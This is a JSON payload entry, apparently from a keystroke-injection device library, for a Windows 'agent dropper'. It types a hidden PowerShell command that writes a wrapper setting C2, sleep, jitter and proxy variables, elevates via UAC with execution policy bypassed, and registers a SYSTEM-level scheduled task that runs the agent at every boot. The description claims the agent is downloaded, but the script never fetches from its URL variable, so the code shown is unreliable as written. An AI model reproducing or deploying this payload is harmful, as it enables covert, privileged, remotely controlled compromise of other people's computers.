{
  "name": "Windows Agent Dropper (SYSTEM Scheduled Task)",
  "category": "Persistence",
  "os": "Windows",
  "description": "Elevates (UAC), downloads agent to ProgramData, creates SYSTEM OnStart task pointing to a wrapper that sets env (C2/JITTER/SLEEP/PROXY) and launches agent.",
  "script": "REM Windows Agent Dropper - SYSTEM Scheduled Task (requires UAC accept)\nGUI r\nDELAY 400\nSTRING powershell -w hidden -nop -c \"$ErrorActionPreference='SilentlyContinue';$u='${AGENT_URL}';$d=$env:ProgramData+'\\DB';New-Item -Force -ItemType Directory -Path $d|Out-Null;$p=$d+'\\db-agent.exe';$w=$d+'\\run-agent.cmd';$c=\"@echo off`r`nset DB_C2=${C2_URL}`r`nset DB_SLEEP=${SLEEP:=60}`r`nset DB_JITTER=${JITTER:=30}`r`nset DB_PROXY=${PROXY}`r`n\"+\"\"\"%~dp0db-agent.exe\"\"\";Set-Content -LiteralPath $w -Value $c -Encoding ASCII;Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList \"-NoProfile -ExecutionPolicy Bypass -Command \"\"schtasks /Create /SC ONSTART /TN \\\"DB-Agent\\\" /TR \\\"$w\\\" /RU SYSTEM /RL HIGHEST /F; schtasks /Run /TN \\\"DB-Agent\\\"\"\"\"\nENTER\n"
}
